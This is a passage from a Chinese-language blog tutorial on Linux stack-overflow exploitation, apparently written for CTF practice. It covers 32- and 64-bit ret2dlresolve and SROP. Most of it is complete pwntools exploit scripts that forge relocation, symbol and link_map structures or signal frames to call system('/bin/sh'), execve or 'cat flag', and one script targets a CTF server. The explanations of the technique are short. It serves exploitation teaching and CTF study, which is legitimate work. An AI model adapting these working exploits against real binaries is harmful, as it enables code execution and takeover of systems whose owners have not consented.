class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed5&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x700</span>  <span class="comment"># adjust according the stack when call the _dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve</span>():</span><br><span class="line">    func_name = <span class="string">&quot;system&quot;</span></span><br><span class="line">    func_args = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header[<span class="string">&#x27;sh_addr&#x27;</span>]</span><br><span class="line">    JMPREL = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_JMPREL&#x27;</span>)</span><br><span class="line">    SYMTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_SYMTAB&#x27;</span>)</span><br><span class="line">    STRTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_STRTAB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_rel_addr = rop_addr + <span class="number">5</span> * <span class="number">4</span></span><br><span class="line">    reloc_offset = fake_rel_addr - JMPREL</span><br><span class="line">    fake_sym_addr = rop_addr + <span class="number">7</span> * <span class="number">4</span></span><br><span class="line">    align = (<span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xF</span>)) &amp; <span class="number">0xF</span></span><br><span class="line">    fake_sym_addr += align</span><br><span class="line">    r_info = ((fake_sym_addr - SYMTAB) / <span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>  <span class="comment"># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#x27;</span></span><br><span class="line">    fake_rel = p32(elf.bss() + <span class="number">0x10</span>) + p32(r_info)</span><br><span class="line">    fake_name_addr = fake_sym_addr + <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    st_name = fake_name_addr - STRTAB</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) * <span class="number">2</span> + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line">    bin_sh_offset = (fake_sym_addr + <span class="number">0x10</span> - rop_addr + <span class="built_in">len</span>(func_name) + <span class="number">3</span>) &amp; ~<span class="number">3</span></span><br><span class="line">    bin_sh_addr = rop_addr + bin_sh_offset</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(resolve_plt)</span><br><span class="line">    payload += p32(reloc_offset)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(bin_sh_addr)</span><br><span class="line">    payload += fake_rel</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += func_name</span><br><span class="line">    payload = payload.ljust(bin_sh_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += func_args + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span></span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p32(elf.search(asm(<span class="string">&#x27;leave;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(ret2dlresolve())</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="位-ret2dlresolve-1">64 位 ret2dlresolve</h2>
<p>64 位下伪造时（<code>.bss</code> 段离 <code>.dynsym</code> 太远）
<code>reloc-&gt;r_info</code> 也很大，最后使得访问
<code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code>
时程序访存出错，导致程序崩溃。因此我们退而求其次选择
<code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 不为 0
时时的程序执行流程，此时计算的目标函数地址为
<code>l-&gt;l_addr + sym-&gt;st_value</code> 。</p>
<p>虽然这种方法无法在不知道 libc 版本的情况下完成利用，但是可以在不泄露
libc 基址的情况下完成利用。</p>
<p>为了实现 64 位的 ret2dlresolve ，我们需要作如下构造：</p>
<ul>
<li><p><code>resolve</code> 函数传入的第二个参数为 0 ，从而从
<code>Elf64_Rel</code> 数组中找到第一个 <code>Elf64_Rel</code>
。</p></li>
<li><p>为了避免更新 got 表时内存访问错误，<code>Elf64_Rel</code> 的
<code>r_offset</code> 加上 <code>link_map-&gt;l_addr</code>
需要指向可读写内存。</p></li>
<li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的低 32 比特设置为
<code>ELF_MACHINE_JMP_SLOT</code> 即 7 。</p></li>
<li><p>为了避免下面这行代码访存错误，需要让 <code>l_info[5]</code>
指向可读写内存。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure></div></li>
<li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的高 32 比特设置为
0 这样找的就是 <code>Elf64_Sym</code> 数组中的第一个
<code>Elf64_Sym</code> 。</p></li>
<li><p><code>link_map-&gt;l_info[6]-&gt;d_un.dptr</code> 指向
<code>puts@got - 8</code> 这样就伪造出 <code>Elf64_Sym</code> 的
<code>st_value</code> 为 <code>puts</code> 函数地址，同时
<code>st_order</code> 也大概率为非 0 。</p></li>
<li><p><code>link_map</code> 的 <code>l_addr</code> 设置为
<code>&amp;system - &amp;puts</code> ，这样
<code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是
<code>system</code> 函数地址。</p></li>
</ul>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9d2f83c616a5538a3a4ea6975318bc19.png"
                     
                      
                
                > 例如 <a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2021hgameweek3_without_leak/without_leak_b7bd5f2d0faebbc6ba6964bca265a506" >2021hgameweek3_without_leak<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>
这道题目。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>栈溢出后面会关闭输出流，无法泄露 libc 地址，因此可以采用
ret2dlresolve 的方式实现任意命令执行。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process([<span class="string">&#x27;./without_leak&#x27;</span>])</span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,1234)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./without_leak&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rw_mem = elf.bss() + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">n64 = <span class="keyword">lambda</span> x: (x + <span class="number">0x10000000000000000</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_fake_link_map</span>(<span class="params">fake_linkmap_addr, func, base_func=<span class="string">&#x27;puts&#x27;</span></span>):</span><br><span class="line">    offset = n64(libc.sym[func] - libc.sym[base_func])</span><br><span class="line">    linkmap = p64(offset)  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(elf.bss())  <span class="comment"># l_info[5]</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x100</span>)  <span class="comment"># l_info[6]</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x110</span>)  <span class="comment"># l_info[23]</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(elf.got[base_func] - <span class="number">8</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(fake_linkmap_addr + <span class="number">0x120</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(n64(elf.bss() - offset)) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  <span class="comment"># Elf64_Rel</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *system\nb *0x40119A\ndir /glibc/2.35/source&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fake_link_map_addr = elf.bss() + <span class="number">0x800</span></span><br><span class="line">fake_link_map = build_fake_link_map(fake_link_map_addr, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = fake_link_map_addr + <span class="built_in">len</span>(fake_link_map)</span><br><span class="line">resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="number">0x28</span> * <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rsi; pop r15; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(fake_link_map_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(sh_addr)</span><br><span class="line">payload += p64(resolve_plt + <span class="number">6</span>)</span><br><span class="line">payload += p64(fake_link_map_addr)  <span class="comment"># truct link_map *l</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># ElfW(Word) reloc_arg</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = fake_link_map + <span class="string">&#x27;cat flag&gt;&amp;0\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h1 id="srop">SROP</h1>
<p>简单的说就是如果系统调用 <code>rt_sigreturn</code> 时会根据当前栈顶的
<code>Signal Frame</code> 结构恢复各寄存器的值。通过伪造
<code>Signal Frame</code> 并通过构造 rop 使程序执行
<code>rt_sigreturn</code>
就可以执行想要执行的函数以及把栈迁移到任意地址。</p>
<p>以 64 位为例，其中一种构造方式如下： 其中 0xF 为
<code>rt_sigreturn</code> 的系统调用号。 <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/036ee63b7bb54a4fe5d98c064c787fec.png"
                     
                      
                
                >
<code>Signal Frame</code> 结构如下： <img  

                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e3e1b6a53bd2c560f2b08fc27d87d60d.png"
                     
                      
                
                > 通过设置
<code>Signal Frame</code> 的 rsp 的值栈迁移，可以连读多次进行 SROP。
<img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d69ea986473e28e4a4ac62a88a12edec.png"
                     
                      
                
                >
例题：rootersctf_2019_srop</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, ::buf, <span class="number">0x2AuLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sys_read</span>(<span class="number">0</span>, buf, <span class="number">0x400uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>存在栈溢出。</p>
<p>可供利用的 gadget ：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br></pre></td></tr></table></figure></div>
<p>可以完成改 rax 和 系统调用，不过 ret 前多了一个 leave ，因此连续 SROP
时不能像前面示意图那样直接改 rsp ，而是将 rbp 设为目标栈地址 + 8
，利用栈迁移将栈顶迁移到目标地址。</p>
<p>第一次 SROP 可以调用 read 向 .data 段的 buf 写入第二段 rop 以及
<code>/bin/sh\x00</code> 字符串。 第二次 SROP 执行 execve 获取 shell
。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26384</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./rootersctf_2019_srop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./rootersctf_2019_srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buf_addr = <span class="number">0x402000</span></span><br><span class="line">    syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">    pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span>  <span class="comment"># read</span></span><br><span class="line">    frame.rdi = <span class="number">0</span>  <span class="comment"># stdin</span></span><br><span class="line">    frame.rsi = buf_addr  <span class="comment"># buf</span></span><br><span class="line">    frame.rdx = <span class="number">0x400</span>  <span class="comment"># size</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line">    frame.rbp = buf_addr</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Hey, can i get some feedback for the CTF?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">59</span>  <span class="comment"># execve</span></span><br><span class="line">    frame.rdi = buf_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> linux 栈溢出</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 03:10:56</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-20 03:33:31
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/linux-stack-overflow/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-user-pwn/">#linux user pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-format-string-exploit/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux 格式化字符串利用</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/linux-IO_FILE-exploit/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux IO_FILE 利用</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">linux 栈溢出</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">逻辑漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%86%99"><span class="nav-text">手写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwntools-%E7%94%9F%E6%88%90"><span class="nav-text">pwntools 生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%AF-ascii-%E7%A0%81-shellcode"><span class="nav-text">纯 ascii 码 shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x00-%E6%88%AA%E6%96%AD"><span class="nav-text">\x00 截断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95-shellcode"><span class="nav-text">测试 shellcode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-text">ret2syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D"><span class="nav-text">32位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%8D-1"><span class="nav-text">64位</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6"><span class="nav-text">linux延迟绑定机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="nav-text">泄露函数地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#canary-%E7%BB%95%E8%BF%87"><span class="nav-text">canary 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2canary"><span class="nav-text">泄露canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%90%E5%AD%97%E8%8A%82%E7%88%86%E7%A0%B4"><span class="nav-text">逐字节爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-__stack_chk_failed-%E5%87%BD%E6%95%B0"><span class="nav-text">劫持 __stack_chk_failed 函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-__stack_chk_failed-%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE"><span class="nav-text">利用
